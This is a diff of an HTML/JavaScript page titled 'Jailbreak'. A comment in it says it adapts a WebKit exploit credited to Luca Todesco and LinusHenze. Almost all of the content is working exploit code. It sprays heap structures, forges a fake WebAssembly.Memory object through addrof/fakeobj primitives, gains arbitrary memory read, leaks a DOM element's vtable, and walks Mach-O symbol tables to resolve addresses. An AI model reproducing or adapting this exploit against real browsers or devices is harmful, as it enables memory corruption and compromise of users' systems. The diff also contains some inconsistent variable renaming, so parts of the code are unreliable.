@@ -1,5 +1,108 @@
+<html>
+    <head>
+        <style>
+            body {
+                font-family: monospace;
+            }
+            </style>
+        </head>
+    <title>Jailbreak</title>
+    <body>
+        
+        </body>
 <script src="utils.js"> </script>
 <script>
+    //var magic =  r32(base);
+    //log('[+] Which has magic '+magic.toString(16));
+    let alert1 = function(msg) {
+        document.body.innerText += msg + '\n';
+    }
+    function dec2hex(n) {
+        if(n < 0) {
+            n = 0xFFFFFFFF + n + 1;
+        }
+        return "0x" + ("00000000" + n.toString(16).toUpperCase()).substr(-8);
+    }
+    function hex2a(hex) {
+var str = '';
+for (var i = 0; i < hex.length; i += 2) {
+    var v = parseInt(hex.substr(i, 2), 16);
+    if (v) str += String.fromCharCode(v);
+}
+return str;
+}
+    function _u32(i)
+{
+    return b2u32(this.read(i, 4));
+}
+
+
+
+
+
+
+
+
+
+function fsyms(mem, base, segs, want, syms)
+{
+    want = Array.from(want); // copy
+    if(syms === undefined)
+    {
+        syms = {};
+    }
+
+    var stab = null;
+    alert1("here");
+    var ncmds = memory.u32(Add(base, 0x10));
+    for(var i = 0, off = 0x20; i < ncmds; ++i)
+    {
+        var cmd = memory.u32(Add(base, off))
+        if(cmd == 0x2) // LC_SYMTAB
+        {
+            var b = memory.read(Add(base, off + 0x8), 0x10);
+            stab =
+            {
+                symoff:  b2u32(b.slice(0x8, 0xc)),
+                nsyms:   b2u32(b.slice(0xc, 0x10)),
+                stroff:  b2u32(b.slice(0x10, 0x14)),
+                strsize: b2u32(b.slice(0x14, 0x18)),
+            };
+            break;
+        }
+        off += memory.u32(Add(base, off + 0x4));
+    }
+    if(stab == null)
+    {
+        fail("stab");
+    }
+    var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
+    var fn = function(i)
+    {
+        return memory.read(Add(tmp.base, tmp.off + i),0x10);
+    };
+    for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
+    {
+        tmp.off = memory.u32(off2addr(segs, stab.symoff + i * 0x10));
+        for(var j = 0; j < want.length; ++j)
+        {
+            var s = want[j];
+            if((strcmp(fn, s)))
+            {
+                syms[s] = memory.read_i64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
+                want.splice(j, 1);
+                break;
+            }
+        }
+    }
+    return syms;
+}
+
+    //log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
+    //tmp = base;
+    //var hdr = Add(0x180000000,slide);
+   // log(hdr + hdr1)
+   let count = 1;
 /*
  * This code is taken from a GitHub user that I sadly forgot the name of.
  * The code exploits a vulnerability discovered in WebKit by Luca Todesco.
@@ -57,14 +160,29 @@ function hexdump(buffer, blockSize, base) {
     return lines.join("<br/>");
 }
 let logic = 0;
-function off2addr(segs, off)
+
+function mappedAddress(mapping, addr1) {
+    if(!(addr1 instanceof Int64)) addr1 = new Int64(addr1);
+    for (cc = 0; cc < mapping.length; ++cc) {
+        if ((mapping[cc].addr <= addr1) && (addr1 < (Add(mapping[cc].addr,mapping[cc].size)))) {
+            // >= <
+            var cacheoffset = Sub(Add(mapping[cc].fileoff,addr1),mapping[cc].addr);
+            //alert("debug-cacheoffset:" + cacheoffset)
+            return cacheoffset;
+        }
+        else {
+            alert("mismatch" + addr1 + "vs" + Add(mapping[cc].addr,mapping[cc].size) + "or" + mapping[cc].addr)
+        }
+    }
+}
+function off2addr(mappings, off)
     {
   
         if(!(off instanceof Int64)) off = new Int64(off);
-        for(var i = 0; i < segs.length; ++i)
+        for(var i = 0; i < mappings.length; ++i)
         {
-            var start = segs[i].fileoff;
-            var end   = Add(start, segs[i].size);
+            var start = mappings[i].fileoff; //cachestart
+            var end   = Add(start, segs[i].size); //cacheend
            // alert("start" + start + "end" + end + "off" + off)
             if
             (
@@ -73,12 +191,12 @@ function off2addr(segs, off)
             )
             {
                 //logic = 1;
-               // alert("returning"+ Add(segs[i].addr, Sub(off, start)));
-                return Add(segs[i].addr, Sub(off, start));
+                //alert("returning"+ Add(segs[i].addr, Sub(off, start)));
+                return Add(mappings[i].addr, Sub(off, start));
             }
 
         }
-        return new Int64("0x4141414141414141");
+        //return new Int64("0x4141414141414141");
     }
 
 function strcmp(b, str)
@@ -88,6 +206,7 @@ function strcmp(b, str)
     {
         if(fn(i) != str.charCodeAt(i))
         {
+            
             return false;
         }
     }
@@ -233,7 +352,7 @@ function exploit(){
         return confuse[1];
     }
     function pwn()
-    {
+{
 
 function foo(obj) {
    return delete obj['x'];
@@ -248,21 +367,21 @@ function foo(obj) {
    foo({});
    foo({x:0x4141414141});
 }
-        alert("starting");
+        alert1("starting");
         log('[*] Spraying structures to get a butterfly (1/2)...');
         // copy paste from: 
         // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
         var structs = [];
-        /*for (var i = 0; i < 0x5000; i++) {
+        for (var i = 0; i < 0x5000; i++) {
             var a = new Float64Array(1);
             a['prop' + i] = 1337;
             structs.push(a);
-        }*/
+        }
         
         log('[*] Spraying structures to get a butterfly (2/2)...');
         for (var i = 0; i < 50; i++) {
             var a = new WebAssembly.Memory({inital: 0});
-            a['prop' + i] = 1337;
+            a['prop' + i] = 1339;
             structs.push(a);
         }
         
@@ -273,7 +392,7 @@ function foo(obj) {
         var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
         
         var jsCellHeader = new Int64([
-            0x00, 0x05, 0x00, 0x00, 
+            0x00, 0x10, 0x00, 0x00,
             0x0,                    
             0x2c,                   
             0x08,                  
@@ -325,18 +444,23 @@ function foo(obj) {
         var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr+16,parseInt(u));
         var maxtry = 0;
         
-        if (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
-        while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
+        if (fakeWasmBuffer instanceof WebAssembly.Memory) {
+            log('gotcha!');
+            //continue;
+        } else {
+            while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
             jsCellHeader.assignAdd(jsCellHeader, Int64.One);
             wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
             maxtry++;
-            if (maxtry == 10000) {
-                fail("5000 tries on getting valid structid failed!!!");
+            if (maxtry == 100000)
+            {
+                fail("wow 5000 tries on getting valid structid failed!!!");
             }
         }
-    } else {
+            log('[+] Successfully got fakeobj as WASMObject');
+    } /*else {
         log('[+] Successfully got fakeobj as WASMObject');
-    }
+    }*/
         //log('[+] Successfully got fakeobj as WASMObject');
         var wasmMemRawAddr = __addrof(wasmInternalMemory);
         var wasmMem = fake_obj_at_address2(wasmMemRawAddr+16,parseInt(u));    
@@ -504,22 +628,26 @@ function foo(obj) {
             addr= new Int64(addr);
             return new Int64('0x'+memory.read_i8(Add(addr, 3)).toString(16) + memory.read_i8(Add(addr, 2)).toString(16) + memory.read_i8(Add(addr, 1)).toString(16) + memory.read_i8(addr).toString(16));
         };
-        //log('[*] Creating the HTMLDivElement wrapper...');
+        memory.u32 = _u32;
+        log('[*] Creating the HTMLDivElement wrapper...');
         var d = document.createElement('div');
         let ad_div = addrof(d);
-       // log('[+] Address of the div is '+ad_div.toString(16));
+        log('[+] Address of the div is '+ad_div.toString(16));
         //alert(FPO)
         let exe_ptr = memory.read_i64(Add(ad_div, FPO),0);
-        //log('[+] Executable instance is at '+exe_ptr.toString(16));
+        log('[+] Executable instance is at '+exe_ptr.toString(16));
         let v_tlb = memory.read_i64(exe_ptr,0);
-        //log('[+] NativeJitCode vtable seems to be at '+v_tlb.toString(16));
-        //var anchor = memory.read_i64(v_tlb,0);
-        //log('anchor' + anchor)
-        //var hdr = Sub(anchor, anchor.lo() & 0xfff);
+        log('[+] divelement vtable seems to be at '+v_tlb.toString(16));
+        var anchor = memory.read_i64(v_tlb,0);
         
-}
+        
+        
+        success = 0;
+        }
+        
+
     
-    let log = alert
+    let log = alert1
     var success = 2;
         try{
         pwn();
@@ -532,6 +660,9 @@ function foo(obj) {
     } else {
         fail("failed");
     }
-}
+    }
+
 exploit();
+
 </script>
+</html>
